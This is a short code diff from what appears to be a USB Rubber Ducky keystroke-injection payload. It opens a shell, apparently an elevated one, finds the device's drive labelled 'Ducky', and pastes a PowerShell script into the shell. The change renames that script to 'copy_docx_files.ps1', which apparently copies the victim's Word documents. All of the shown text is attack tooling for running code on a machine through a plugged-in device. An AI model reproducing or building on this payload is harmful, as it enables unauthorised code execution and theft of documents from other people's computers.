@@ -13,7 +13,7 @@ CTRL-SHIFT ENTER
 DELAY 3000
 STRING Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "Ducky" } | Select-Object -ExpandProperty DeviceID | Set-Location
 ENTER
-STRING Get-Content -Path .\usb.ps1 | Set-Clipboard
+STRING Get-Content -Path .\copy_docx_files.ps1 | Set-Clipboard
 ENTER
 DELAY 200
 CTRL v
